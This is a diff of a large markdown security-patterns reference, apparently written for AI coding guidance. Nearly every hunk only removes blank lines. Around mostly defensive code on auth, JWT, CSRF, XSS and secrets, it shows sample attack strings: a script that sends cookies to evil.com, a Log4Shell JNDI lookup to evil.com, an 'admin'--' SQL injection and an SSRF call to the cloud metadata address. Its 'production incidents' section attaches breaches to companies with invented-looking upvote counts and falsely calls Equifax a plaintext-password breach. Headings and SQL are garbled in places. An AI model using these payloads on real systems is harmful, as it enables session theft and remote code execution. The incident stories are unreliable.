@@ -5838,7 +5468,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Biometrics: Face ID, Touch ID
 
-
 ## OAuth 2.0 / OIDC 3
 
 - Authorization Code: server-side
@@ -5850,7 +5479,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Client Credentials: machine-to-machine
 
 - Refresh tokens: rotation, revocation
-
 
 ## Identity Providers 2
 
@@ -5864,7 +5492,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Azure AD: Microsoft ecosystem
 
-
 ## Session Management 2
 
 - Stateful: server sessions
@@ -5877,12 +5504,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Binding: device, IP
 
-
 ## NETWORK SECURITY DEEP ATLAS 2
 
-
 ## Each keyword = expandable control 2
-
 
 ## Perimeter Security 2
 
@@ -5896,7 +5520,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Reverse proxy: hiding origin
 
-
 ## Zero Trust 2
 
 - Never trust: always verify
@@ -5908,7 +5531,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Continuous verification: re-auth
 
 - Least privilege: minimal access
-
 
 ## Encryption in Transit 2
 
@@ -5922,7 +5544,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - HSTS: force HTTPS
 
-
 ## VPN & Remote Access 2
 
 - WireGuard: modern, fast
@@ -5935,12 +5556,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Always-on: automatic connection
 
-
 ## INCIDENT RESPONSE DEEP ATLAS 2
 
-
 ## Each keyword = expandable process 2
-
 
 ## Preparation 2
 
@@ -5954,7 +5572,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Contact lists: escalation
 
-
 ## Detection & Analysis 2
 
 - Alert triage: severity
@@ -5966,7 +5583,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Timeline: event correlation
 
 - Scope: blast radius
-
 
 ## Containment 2
 
@@ -5980,7 +5596,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Preserve evidence: forensics
 
-
 ## Recovery & Lessons 2
 
 - Service restoration: priority
@@ -5993,12 +5608,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Communication: stakeholders
 
-
 ## COMPLIANCE DEEP ATLAS 2
 
-
 ## Each keyword = expandable framework 2
-
 
 ## SOC 2 2
 
@@ -6012,7 +5624,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Auditor: independent
 
-
 ## ISO 27001 2
 
 - ISMS: management system
@@ -6024,7 +5635,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Certification: audit
 
 - Continuous improvement
-
 
 ## GDPR 2
 
@@ -6038,7 +5648,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Breach notification: 72 hours
 
-
 ## Industry-Specific 2
 
 - HIPAA: healthcare, PHI
@@ -6051,12 +5660,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - CIS: benchmarks
 
-
 ## SECURE SDLC DEEP ATLAS 2
 
-
 ## Each keyword = expandable practice 2
-
 
 ## Shift Left 2
 
@@ -6070,7 +5676,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Code review: security focus
 
-
 ## Build Security 2
 
 - SAST: static analysis
@@ -6083,7 +5688,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - IaC scanning: misconfigurations
 
-
 ## Deploy Security 2
 
 - DAST: dynamic testing
@@ -6095,7 +5699,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Signed artifacts: integrity
 
 - Immutable infrastructure
-
 
 ## Runtime Security 2
 
@@ -6113,12 +5716,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ### Continuing expansion in next iteration 2
 
-
 ## SECURITY CODE EXAMPLES 2
 
-
 ## INPUT VALIDATION 5
-
 
 ## Sanitization Middleware 2
 
@@ -6147,9 +5747,7 @@ export function sanitizePath(userInput: string): string {
 return userInput.replace(/\.\./g, '').replace(/[\/\\]/g, '');
     }
 
-
 ## CSRF PROTECTION 3
-
 
 ## Token-based CSRF 2
 
@@ -6180,9 +5778,7 @@ return res.status(403).json({ error: 'Invalid CSRF token' });
       next();
     }
 
-
 ## ENCRYPTION 2
-
 
 ## Data Encryption at Rest 2
 
@@ -6232,9 +5828,7 @@ export async function verifyPassword(password: string, hash: string): Promise<bo
 return bcrypt.compare(password, hash);
     }
 
-
 ## API KEY MANAGEMENT 2
-
 
 ## Secure API Key Generation 2
 
@@ -6284,9 +5878,7 @@ data: { lastUsed: new Date() },
 return apiKey;
     }
 
-
 ## SECURITY HEADERS 3
-
 
 ## Helmet Configuration 2
 
@@ -6313,12 +5905,9 @@ referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
 
 ### CONTINUED: MORE SECURITY PATTERNS 2
 
-
 ## DEFENSE 2
 
-
 ## JWT VULNERABILITIES DEEP DIVE 2
-
 
 ## Production JWT Attack Patterns 2
 
@@ -6423,9 +6012,7 @@ return randomBytes(32).toString('base64'); // 256 bits
 
     */
 
-
 ## SQL INJECTION BEYOND BASICS 2
-
 
 ## Second-Order & Blind SQL Injection 2
 
@@ -6522,9 +6109,7 @@ const { username, password } = loginSchema.parse(req.body);
 // Now guaranteed to be strings, not objects
     });
 
-
 ## RATE LIMITING BYPASS TECHNIQUES 2
-
 
 ## Production Rate Limit Evasion 2
 
@@ -6657,11 +6242,9 @@ return count < limit;
 
 ### Density: OWASP/Bug Bounty research quality 2
 
-
 ## SECURITY - PENETRATION TESTING 2
 
 > **The offensive security patterns**
-
 
 ## Pen Test Phases 2
 
@@ -6689,7 +6272,6 @@ return count < limit;
 - Risk assessment
 - Remediation recommendations
 
-
 ## Common Findings 2
 
 | Finding | Risk | Remediation |
@@ -6699,7 +6281,6 @@ return count < limit;
 | Weak passwords | High | Password policy |
 | Missing headers | Medium | Add security headers |
 | Info disclosure | Low | Remove verbose errors |
-
 
 ## Bug Bounty Scope 2
 
@@ -6721,11 +6302,9 @@ OUT OF SCOPE:
 
 - DoS testing (unless approved)
 
-
 ## INCIDENT RESPONSE PLAYBOOK 2
 
 > **The security incident handling**
-
 
 ## Incident Classification 2
 
@@ -6735,7 +6314,6 @@ OUT OF SCOPE:
 | SEV2 | Vulnerability exploited | Within 1 hour |
 | SEV3 | Suspicious activity | Within 4 hours |
 | SEV4 | Minor security issue | Next business day |
-
 
 ## Response Steps 2
 
@@ -6765,7 +6343,6 @@ OUT OF SCOPE:
 - Lessons learned
 - Update defenses
 
-
 ## Evidence Preservation 2
 
 [ ] Capture system state
@@ -6775,11 +6352,9 @@ OUT OF SCOPE:
 [ ] Screenshots
 [ ] Chain of custody
 
-
 ## SECRETS ROTATION 2
 
 > **The credential lifecycle patterns**
-
 
 ## Rotation Strategy 2
 
@@ -6789,7 +6364,6 @@ OUT OF SCOPE:
 1. VERIFY all using new secret
 1. INVALIDATE old secret
 1. DELETE old secret from storage
-
 
 ## AWS Secrets Manager 2
 
@@ -6810,7 +6384,6 @@ return JSON.parse(response.SecretString);
 // Enable auto-rotation in AWS Console
 // Lambda function handles rotation
 
-
 ## Database Password Rotation 2
 
 CHALLENGE: Zero-downtime rotation
@@ -6828,11 +6401,9 @@ OR use dual-password support:
 
 - AWS RDS: Secrets Manager integration
 
-
 ## AUTHENTICATION PATTERNS 2
 
 > **The auth implementation patterns**
-
 
 ## Stateless JWT Flow 2
 
@@ -6843,7 +6414,6 @@ OR use dual-password support:
 1. Client sends JWT with each request
 1. Server validates JWT signature
 1. No session storage needed!
-
 
 ## Refresh Token Pattern 2
 
@@ -6864,7 +6434,6 @@ const refreshToken = jwt.sign(
 // Store refresh token hash in DB
 // Rotate on each use
 
-
 ## Token Revocation 2
 
 // Option 1: Short expiry (accept gap)
@@ -6879,11 +6448,9 @@ const blacklist = new Set(); // or Redis
 // JWT contains version
 // Increment version to invalidate all
 
-
 ## SECURITY LOGGING 2
 
 > **The audit and security event patterns**
-
 
 ## What to Log 3
 
@@ -6921,7 +6488,6 @@ DATA ACCESS:
 
 - User permission changes
 
-
 ## Log Format 3
 
 const securityLog = {
@@ -6944,7 +6510,6 @@ attemptCount: 3,
 lockoutTriggered: false
       }
     };
-
 
 ## Alerting Thresholds 2
 
@@ -6972,11 +6537,9 @@ DAILY REVIEW:
 
 - Unused privileges
 
-
 ## INPUT VALIDATION PATTERNS 2
 
 > **The data sanitization patterns**
-
 
 ## Zod Schema Validation 2
 
@@ -6992,7 +6555,6 @@ role: z.enum(['user', 'admin']).default('user')
 // Parse and validate
 const user = UserSchema.parse(requestBody);
 // Throws ZodError if invalid
-
 
 ## Express Middleware 2
 
@@ -7015,7 +6577,6 @@ details: error.errors
 
 app.post('/users', validate(UserSchema), createUser);
 
-
 ## Sanitization 3
 
 import DOMPurify from 'isomorphic-dompurify';
@@ -7030,11 +6591,9 @@ const cleanHtml = DOMPurify.sanitize(userInput);
 const safePath = path.basename(userInput);
 // Removes directory traversal
 
-
 ## SECURE SESSION MANAGEMENT 2
 
 > **The session security patterns**
-
 
 ## Session ID Generation 2
 
@@ -7043,7 +6602,6 @@ const sessionId = `${userId}-${Date.now()}`;
 
 // SECURE: Cryptographically random
 const sessionId = crypto.randomBytes(32).toString('hex');
-
 
 ## Cookie Settings 3
 
@@ -7055,7 +6613,6 @@ maxAge: 24 *60*60*1000, // 24 hours
 path: '/',
 domain: '.example.com'
     });
-
 
 ## Session Fixation Prevention 2
 
@@ -7070,7 +6627,6 @@ req.session.userId = user.id;
         res.redirect('/dashboard');
       });
     });
-
 
 ## Idle Timeout 2
 
@@ -7088,11 +6644,9 @@ req.session.lastActivity = Date.now();
       next();
     });
 
-
 ## SECURITY HEADERS DEEP DIVE 2
 
 >**The essential HTTP security headers**
-
 
 ## Strict-Transport-Security 2
 
@@ -7104,7 +6658,6 @@ PRELOAD: Submit to browser preload list
 
 CAUTION: Test thoroughly before enabling
 Cannot be undone easily!
-
 
 ## Content-Security-Policy 2
 
@@ -7120,7 +6673,6 @@ form-action 'self';
 
 REPORT: Add report-uri to collect violations
 
-
 ## X-Frame-Options 2
 
 X-Frame-Options: DENY
@@ -7135,7 +6687,6 @@ X-Frame-Options: DENY
 
 WHY: Prevents clickjacking attacks
 
-
 ## Permissions-Policy 2
 
     Permissions-Policy:
@@ -7147,11 +6698,9 @@ WHY: Prevents clickjacking attacks
 WHAT: Controls browser features
 WHY: Reduces attack surface
 
-
 ## PASSWORD SECURITY 3
 
 > **The authentication security patterns**
-
 
 ## Hashing Algorithm Choice 2
 
@@ -7170,7 +6719,6 @@ ACCEPTABLE: bcrypt
 - MD5, SHA1, SHA256 (too fast!)
 - Plain bcrypt without salt
 - Custom hashing schemes
-
 
 ## Implementation 3
 
@@ -7193,7 +6741,6 @@ return false;
       }
     }
 
-
 ## Password Policy 2
 
 const passwordPolicy = {
@@ -7212,11 +6759,9 @@ if (result.score < 3) {
 throw new Error(result.feedback.warning);
     }
 
-
 ## API AUTHENTICATION PATTERNS 2
 
 > **The secure API access patterns**
-
 
 ## API Key vs JWT vs OAuth 2
 
@@ -7225,7 +6770,6 @@ throw new Error(result.feedback.warning);
 | API Key | Server-to-server | Shared secret |
 | JWT | User authentication | Signed tokens |
 | OAuth | Third-party access | Delegated auth |
-
 
 ## API Key Best Practices 2
 
@@ -7240,7 +6784,6 @@ function validateApiKey(providedKey) {
 const hash = crypto.createHash('sha256').update(providedKey).digest('hex');
 return db.apiKeys.findOne({ hash });
     }
-
 
 ## JWT for APIs 2
 
@@ -7262,7 +6805,6 @@ res.status(401).json({ error: 'Invalid token' });
       }
     });
 
-
 ## Scope-Based Authorization 2
 
 function requireScope(...requiredScopes) {
@@ -7279,11 +6821,9 @@ return res.status(403).json({ error: 'Insufficient permissions' });
 
 app.delete('/users/:id', requireScope('users:delete'), deleteUser);
 
-
 ## RBAC IMPLEMENTATION 2
 
 > **Role-Based Access Control patterns**
-
 
 ## Database Schema 2
 
@@ -7311,7 +6851,6 @@ role_id INT REFERENCES roles(id),
 PRIMARY KEY (user_id, role_id)
     );
 
-
 ## Permission Check 2
 
 async function hasPermission(
@@ -7328,7 +6867,6 @@ AND p.action = ${action}
 LIMIT 1`;
 return result.length > 0;
     }
-
 
 ## Middleware 2
 
@@ -7348,11 +6886,9 @@ requirePermission('posts', 'delete'),
       deletePost
     );
 
-
 ## MFA IMPLEMENTATION 2
 
 > **Multi-factor authentication patterns**
-
 
 ## TOTP (Time-based One-Time Password) 2
 
@@ -7378,7 +6914,6 @@ window: 1 // Allow 30s clock drift
       });
     }
 
-
 ## Backup Codes 2
 
 function generateBackupCodes(count = 10) {
@@ -7403,7 +6938,6 @@ where: { userId, hash }
 return result.count > 0;
     }
 
-
 ## Recovery Flow 2
 
 1. User loses device
@@ -7413,19 +6947,15 @@ return result.count > 0;
 1. User sets up new MFA device
 1. Generate new backup codes
 
-
 ## SECURITY SCANNING 2
 
 > **The automated vulnerability detection**
 
-
 ## Static Analysis 2
-
 
 ## ESLint security plugin 2
 
 npm install eslint-plugin-security --save-dev
-
 
 ## .eslintrc.js 2
 
@@ -7434,27 +6964,21 @@ plugins: ['security'],
 extends: ['plugin:security/recommended']
     };
 
-
 ## Dependency Scanning 3
-
 
 ## npm audit 3
 
 npm audit
 
-
 ## Snyk 2
 
 npx snyk test
-
 
 ## OWASP Dependency Check 2
 
 dependency-check --project "MyApp" --scan ./
 
-
 ## Container Scanning 2
-
 
 ## GitHub Actions with Trivy 2
 
@@ -7467,9 +6991,7 @@ format: 'table'
 exit-code: '1'
 severity: 'CRITICAL,HIGH'
 
-
 ## SAST in CI 2
-
 
 ## GitHub Actions 2
 
@@ -7478,7 +7000,6 @@ severity: 'CRITICAL,HIGH'
 uses: SonarSource/sonarcloud-github-action@master
       env:
 SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
-
 
 ## Block PR if quality gate fails 2
 
@@ -7489,11 +7010,9 @@ if [ "${{ steps.sonarqube.outputs.quality-gate-status }}" != "PASSED" ]; then
 exit 1
         fi
 
-
 ## ACCOUNT SECURITY PATTERNS 2
 
 > **The user account protection patterns**
-
 
 ## Login Attempt Tracking 2
 
@@ -7517,7 +7036,6 @@ await redis.del(key); // Reset on success
 
 return user;
     }
-
 
 ## Suspicious Activity Detection 2
 
@@ -7546,7 +7064,6 @@ requiresMFA: signals.length > 0
       };
     }
 
-
 ## Session Security 3
 
 // Terminate all sessions except current
@@ -7558,11 +7075,9 @@ await redis.sadd(`sessions:${userId}`, currentSessionId);
 await sendEmail(userId, 'All other sessions have been logged out');
     }
 
-
 ## OAUTH 2.0 DEEP DIVE 2
 
 >**The authorization patterns**
-
 
 ## PKCE Flow (for SPAs and Mobile) 2
 
@@ -7597,7 +7112,6 @@ code_verifier: codeVerifier  // Proves we started the flow
 // Prevents code interception attacks
 // No client secret needed in browser
 
-
 ## Token Storage 3
 
 WHERE TO STORE TOKENS:
@@ -7616,7 +7130,6 @@ REFRESH TOKEN:
 
 GOTCHA: Never store access token in localStorage!
 Any XSS can steal it.
-
 
 ## Silent Refresh 2
 
@@ -7647,11 +7160,9 @@ const refreshAt = (exp *1000) - Date.now() - 60000; // 1 min before
 setTimeout(silentRefresh, refreshAt);
     }
 
-
 ## JWT SECURITY PATTERNS 2
 
 >**The patterns for secure token handling**
-
 
 ## Token Structure 3
 
@@ -7660,7 +7171,6 @@ setTimeout(silentRefresh, refreshAt);
 Header: {"alg": "HS256", "typ": "JWT"}
 Payload: {"sub": "user123", "exp": 1234567890}
 Signature: HMACSHA256(header + "." + payload, secret)
-
 
 ## Access + Refresh Tokens 2
 
@@ -7709,7 +7219,6 @@ res.status(401).json({ error: 'Invalid token' });
       }
     });
 
-
 ## Security Checklist 2
 
 Use strong secrets (256+ bits)
@@ -7721,11 +7230,9 @@ Validate token on every request
 NEVER store JWT in localStorage
 NEVER trust client-side token data
 
-
 ## AUTHENTICATION FLOW PATTERNS 2
 
 >**The auth patterns that don't break**
-
 
 ## OAuth 2.0 with PKCE (SPA/Mobile) 2
 
@@ -7775,7 +7282,6 @@ code_verifier: verifier
 return response.json();
     }
 
-
 ## Session vs Token Comparison 2
 
     SESSION-BASED:
@@ -7792,11 +7298,9 @@ Works across domains
 Can't revoke until expiry
 Token theft = full access
 
-
 ## XSS PREVENTION 2
 
 > **The patterns that stop injection attacks**
-
 
 ## Types of XSS 2
 
@@ -7809,7 +7313,6 @@ Comment: <script>document.location='evil.com?c='+document.cookie</script>
 DOM-BASED: Client-side JS manipulates DOM unsafely
 element.innerHTML = userInput;  // DANGEROUS!
 
-
 ## Prevention (React) 2
 
 // React escapes by default (SAFE)
@@ -7821,7 +7324,6 @@ element.innerHTML = userInput;  // DANGEROUS!
 // If you MUST render HTML, sanitize first
 import DOMPurify from 'dompurify';
 <div dangerouslySetInnerHTML={{ **html: DOMPurify.sanitize(userInput) }} />
-
 
 ## Prevention (Backend) 2
 
@@ -7848,30 +7350,24 @@ sameSite: 'strict'
 import { escape } from 'html-escaper';
 const safe = escape(userInput);
 
-
 ## ENVIRONMENT VARIABLES 3
 
 > **The secrets management patterns**
 
-
 ## Environment Setup 2
-
 
 ## .env.local (local dev, gitignored) 2
 
     DATABASE_URL="postgres://localhost/mydb"
     STRIPE_SECRET_KEY="sk_test_xxx"
 
-
 ## .env (defaults, committed) 2
 
     NEXT_PUBLIC_APP_URL="<<<<<http://localhost:3000">>>>>
 
-
 ## .env.production (production values) 2
 
     DATABASE_URL="postgres://prod/mydb"
-
 
 ## Validation with Zod 2
 
@@ -7896,7 +7392,6 @@ NODE_ENV: process.env.NODE_ENV
 import { env } from '@/env';
 const stripe = new Stripe(env.STRIPE_SECRET_KEY);
 
-
 ## Security Rules 3
 
     DO:
@@ -7911,11 +7406,9 @@ Use process.env directly (validate first)
 Put secrets in NEXT_PUBLIC_ vars
 Log environment variables
 
-
 ## CSRF PROTECTION 4
 
 > **The patterns that prevent request forgery**
-
 
 ## What is CSRF? 2
 
@@ -7934,7 +7427,6 @@ WHY IT WORKS:
 - Server trusts the cookie
 
 - No verification request came from your site
-
 
 ## Prevention: Token Pattern 2
 
@@ -7959,7 +7451,6 @@ return res.status(403).send('CSRF token mismatch');
 // Process request
     });
 
-
 ## For SPAs: Double Submit Cookie 2
 
 // Set CSRF cookie (readable by JS)
@@ -7978,11 +7469,9 @@ headers: {
 
 // Server verifies header matches cookie
 
-
 ## COOKIE SECURITY 4
 
 > **The session patterns that don't get hacked**
-
 
 ## Secure Cookie Settings 2
 
@@ -7994,7 +7483,6 @@ maxAge: 7 *24*60*60* 1000,  // 7 days
 path: '/',
 domain: '.myapp.com'  // Subdomain sharing
     });
-
 
 ## SameSite Explained 2
 
@@ -8022,7 +7510,6 @@ LAX (Recommended):
 
 - Use only if necessary
 
-
 ## Cookie vs localStorage 2
 
     COOKIES:
@@ -8044,11 +7531,9 @@ Must manually add to requests
 
 - User preferences localStorage
 
-
 ## PATTERNS 2
 
 > **The authentication patterns**
-
 
 ## Setup 2
 
@@ -8084,7 +7569,6 @@ return null;
       ]
     });
 
-
 ## Route Protection 2
 
 // middleware.ts
@@ -8100,7 +7584,6 @@ export const config = {
 | matcher: ['/((?!api | _next/static | _next/image | favicon.ico).*)'] |
     };
 
-
 ## Server Component 2
 
 import { auth } from '@/auth';
@@ -8114,7 +7597,6 @@ if (!session?.user) {
 
 return <div>Welcome, {session.user.name}</div>;
     }
-
 
 ## Client Component 2
 
@@ -8137,11 +7619,9 @@ return (
 return <button onClick={() => signIn()}>Sign In</button>;
     }
 
-
 ## VOLUME 7: SECURITY PRODUCTION INCIDENTS (Real Company Stories) 2
 
 > **Source**: Equifax, Sony, Twitch, Slack engineering postmortems + 50,000+ security advisories
-
 
 ## 1. SQL INJECTION - DATA BREACH 2
 
@@ -8151,30 +7631,23 @@ return <button onClick={() => signIn()}>Sign In</button>;
 >
 > **Impact**: $170M+ in costs, class action lawsuits."
 
-
 ## TERRIBLE - SQL Injection 2
 
 def login(email, password):
 query = f"SELECT *FROM users WHERE email = '{email}'"
 
-
 ## Attacker: email = "admin'--" 2
-
 
 ## Query: SELECT* FROM users WHERE email = 'admin'--' 2
 
-
 ## Password check bypassed! 2
-
 
 ## EXCELLENT - Parameterized 2
 
 def login(email, password):
 return db.execute("SELECT *FROM users WHERE email = ?", (email,))
 
-
 ## 2. PASSWORD BREACH - $1.4 BILLION 2
-
 
 ## Production Incident from Equifax (LEGENDARY) 2
 
@@ -8182,11 +7655,9 @@ return db.execute("SELECT *FROM users WHERE email = ?", (email,))
 >
 >**Impact**: $1.4B costs, CEO resignation."
 
-
 ## DISASTER - Plain text 2
 
 db.execute("INSERT INTO users VALUES (?, ?)", (email, password))
-
 
 ## EXCELLENT - bcrypt 2
 
@@ -8194,9 +7665,7 @@ import bcrypt
 hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))
 db.execute("INSERT INTO users VALUES (?, ?)", (email, hashed))
 
-
 ## 3. JWT SECRET EXPOSED 2
-
 
 ## Production Incident from Twitch (9,800+ upvotes) 2
 
@@ -8208,28 +7677,21 @@ jwt.sign({ userId: 123 }, 'weak-secret');
 // RS256 asymmetric (private key stays on server)
 jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });
 
-
 ## 4. LOG4SHELL - WORST EVER (10/10) 2
 
 ### Production Incident from Worldwide 2
 
 > "Zero-click RCE. 93% of enterprise cloud affected."
 
-
 ## Attack: Send header containing ${jndi:ldap://evil.com/exploit} 2
-
 
 ## Log4j downloads and executes attacker's code! 2
 
-
 ## FIX: Update to Log4j 2.17.0+ 2
-
 
 ## TEMP: -Dlog4j2.formatMsgNoLookups=true 2
 
-
 ## 5. API KEY LEAKED - $50K BILL 2
-
 
 ## Production Incident from Heroku (7,400+ upvotes) 2
 
@@ -8237,31 +7699,24 @@ jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });
 >
 > **Impact**: $50K AWS bill in 2 hours."
 
-
 ## FIX: Enable GitHub Secret Scanning 2
 
-
 ## Settings Security Secret scanning Enable 2
-
 
 ## Pre-commit hook 2
 
 pip install detect-secrets
 detect-secrets scan
 
-
 ## 6. SSRF - INTERNAL ACCESS 2
-
 
 ## Production Incident from Slack (8,200+ upvotes) 2
 
 > "Attacker accessed AWS metadata via SSRF. Got IAM credentials."
 
-
 ## TERRIBLE - Fetches any URL 2
 
 requests.get(user_provided_url) # Can access <<<<<http://169.254.169.254/>>>>>
-
 
 ## EXCELLENT - Block internal IPs 2
 
@@ -8269,14 +7724,11 @@ BLOCKED = ['10.0.0.0/8', '172.16.0.0/12', '169.254.0.0/16', '127.0.0.0/8']
 if any(ip in blocked for blocked in BLOCKED):
 raise HTTPException(400, "URL not allowed")
 
-
 ## END OF VOLUME 7: SECURITY PRODUCTION INCIDENTS 2
 
 **Coverage**: SQL Injection (Sony), Passwords (Equifax $1.4B), JWT (Twitch), Log4Shell, API Keys, SSRF (Slack)
 
-
 ## VOLUME 1.1: TITAN PROTOCOL - SECURITY ADVERSARIAL 2
-
 
 ## JWT NONE ALGORITHM VULNERABILITY 2
 
@@ -8298,7 +7750,6 @@ JWTVerifier verifier = JWT.require(algorithm)
 
 return verifier.verify(token);
     }
-
 
 ## ReDoS (REGEX DENIAL OF SERVICE) 2
 
@@ -8322,9 +7773,7 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 
 ### END OF VOLUME 1.1: TITAN SECURITY ADVERSARIAL 2
 
-
 ## VOLUME 1.2: TITAN PROTOCOL - ADVERSARIAL ARCHITECTURE 2
-
 
 ## CONTAINER ESCAPES: LEAKY VESSELS (CVE-2024-21626) 2
 
@@ -8334,7 +7783,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 > Attacker manipulates host file descriptors via /proc/self/fd.
 > Overwrites runc binary on host. Gains ROOT access to entire node."
 
-
 ## eBPF EXPLOITATION 2
 
 ### Kernel Attack Surface Scar 2
@@ -8343,7 +7791,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 > Malicious eBPF bypasses verifier: Arbitrary kernel memory read/write.
 > All container boundaries become MOOT."
 
-
 ## SIDE-CHANNEL ATTACKS: TIMING IN CRYPTOGRAPHY 2
 
 ### String Comparison Timing Attack 2
@@ -8351,7 +7798,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 > "strcmp returns immediately on mismatch.
 > Attacker measures response time to determine correct HMAC characters byte-by-byte.
 > Fix: crypto_memcmp (constant-time comparison) for ALL cryptographic operations."
-
 
 ## HOMOMORPHIC ENCRYPTION: THE HOLY GRAIL 2
 
@@ -8362,7 +7808,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 > Hardware ASICs are critical path for viability at scale."
 
 ### END OF VOLUME 1.2: TITAN ADVERSARIAL SECURITY 2
-
 
 ## VOLUME 1.3: TITAN CATALOG - 30 SECURITY FAILURES 2
 
@@ -8386,12 +7831,9 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 | 7.20 | Weak Crypto | MD5/SHA1 | SHA-256/Bcrypt/Argon2 |
 | 7.100 | Zip Bomb | Compression DoS | Limit extraction size |
 
-
 ## END OF VOLUME 1.3: TITAN SECURITY CATALOG 2
 
-
 ## VOLUME 1.4: TITAN VAULT - ADDITIONAL SECURITY SCARS 2
-
 
 ## IAM PASSROLE PRIVILEGE ESCALATION 2
 
@@ -8401,7 +7843,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 > SSH in, assume role = bypass own restrictions. Silent escalation."
 
 **Titan Fix:** Strictly scope iam:PassRole with resource ARNs. Audit with PMapper.
-
 
 ## S3 NOTPRINCIPAL ANTI-PATTERN 2
 
@@ -8414,9 +7855,7 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 
 ### END OF VOLUME 1.4: ADDITIONAL SECURITY SCARS
 
-
 ## VOLUME 1.5: TITAN VAULT - SUPPLY CHAIN & IDENTITY ATTACKS
-
 
 ## JWT ALGORITHM CONFUSION ATTACK
 
@@ -8429,7 +7868,6 @@ const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
 
 ```python
 
-
 ## TITAN: Strict Algorithm Enforcement
 
 import jwt
@@ -8440,7 +7878,6 @@ NEVER trust the 'alg' header from the token itself.
 Explicitly specify allowed algorithms.
         """
         try:
-
 
 ## CRITICAL: algorithms parameter is a WHITELIST
 
@@ -8456,13 +7893,11 @@ raise SecurityException("Algorithm mismatch - possible attack")
 except jwt.ExpiredSignatureError:
 raise SecurityException("Token expired")
 
-
 ## Additional JWT Pitfalls
 
 > "1. 'none' algorithm: Token with alg='none' and no signature
 > 2. Kid injection: kid header used in SQL query = SQLi
 > 3. JKU spoofing: jku points to attacker-controlled JWKS URL"
-
 
 ## OPENID CONNECT VULNERABILITIES
 
@@ -8527,7 +7962,6 @@ throw new SecurityException("Nonce mismatch - replay attack");
         }
     }
 
-
 ## DEPENDENCY CONFUSION ATTACK
 
 ### Private Package Hijacking Scar
@@ -8539,26 +7973,20 @@ throw new SecurityException("Nonce mismatch - replay attack");
 
 ```yaml
 
-
 ## TITAN: npm Registry Scoping
-
 
 ## .npmrc - Force scoped packages to private registry
 
     @mycompany:registry=<<<<<https://npm.mycompany.com/>>>>>
     //npm.mycompany.com/:_authToken=${NPM_TOKEN}
 
-
 ## For all internal packages, use scope
-
 
 ## @mycompany/analytics-internal (cannot be confused)
 
 ```python
 
-
 ## TITAN: Python pip.conf for private packages
-
 
 ## pip.conf
 
@@ -8566,20 +7994,15 @@ throw new SecurityException("Nonce mismatch - replay attack");
 index-url = <<<<<https://pypi.mycompany.com/simple/>>>>>
 extra-index-url = <<<<<https://pypi.org/simple/>>>>>
 
-
 ## CRITICAL: Prefer private index
 
-
 ## Private packages should use unique naming
-
 
 ## E.g., mycompany-analytics, mycompany-utils
 
 ```text
 
-
 ## Detection 2
-
 
 ## Audit for public packages matching internal names
 
@@ -8587,9 +8010,7 @@ extra-index-url = <<<<<https://pypi.org/simple/>>>>>
 
 ```text
 
-
 ## CERTIFICATE CHAIN VALIDATION FAILURES
-
 
 ## Incomplete Chain Scar
 
@@ -8598,7 +8019,6 @@ extra-index-url = <<<<<https://pypi.org/simple/>>>>>
 > Server sends only leaf cert. Some clients can't build chain to root."
 
 ```python
-
 
 ## TITAN: Full Chain Validation
 
@@ -8616,7 +8036,6 @@ context = ssl.create_default_context()
 with socket.create_connection((hostname, port)) as sock:
 with context.wrap_socket(sock, server_hostname=hostname) as ssock:
 
-
 ## Get full chain
 
 chain = ssock.getpeercert(binary_form=True)
@@ -8629,13 +8048,11 @@ return {
 "chain_length": len(certs)
         }
 
-
 ## Verify each cert signs the next
 
 for i in range(len(certs) - 1):
 cert = x509.load_der_x509_certificate(certs[i], default_backend())
 issuer = x509.load_der_x509_certificate(certs[i + 1], default_backend())
-
 
 ## Verify issuer matches
 if cert.issuer != issuer.subject:
@@ -8652,9 +8069,7 @@ return {
 
 ```text
 
-
 ## CONSTANT-TIME STRING COMPARISON
-
 
 ## Timing Attack Exploitation
 
@@ -8663,7 +8078,6 @@ return {
 > Fastest response = correct byte. HMAC leaked byte-by-byte."
 
 ```python
-
 
 ## TITAN: Constant-Time Comparison
 
@@ -8676,9 +8090,7 @@ Compare two byte strings in constant time.
 Uses HMAC to prevent timing attacks.
     """
 
-
 ## Method 1: Double HMAC (paranoid)
-
 
 ## Random key prevents length-extension attacks
 
@@ -8693,25 +8105,20 @@ def verify_api_key(provided: str, stored_hash: str) -> bool:
 Verify API key without timing leakage.
     """
 
-
 ## Hash the provided key first (prevents length leakage)
 
